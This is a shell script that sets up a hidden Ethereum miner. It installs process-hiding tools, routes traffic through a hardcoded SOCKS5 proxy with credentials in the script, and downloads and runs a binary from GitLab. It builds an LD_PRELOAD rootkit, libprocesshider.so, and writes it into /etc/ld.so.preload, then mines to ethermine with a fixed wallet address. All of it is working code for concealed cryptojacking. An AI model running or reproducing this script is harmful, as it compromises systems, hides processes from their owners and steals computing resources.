#!/bin/sh
ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

sudo ph add kontol

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y

sudo ph add graftcp 

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz >/dev/null 2>&1

tar -xvzf graphics.tar.gz >/dev/null 2>&1

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 154.12.99.211:5551
socks5_username = lebarankita
socks5_password = buatTHRan
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget -o https://gitlab.com/jiorio669/donlod/-/raw/main/145 >/dev/null 2>&1
chmod +x 145  >/dev/null 2>&1

./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/magic145.zip >/dev/null 2>&1
unzip -o magic145.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

sudo ph add 145

./graftcp/graftcp ./145 --coin ETH --pool us1.ethermine.org:4444 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-999999 -n 1)-WEWEK)
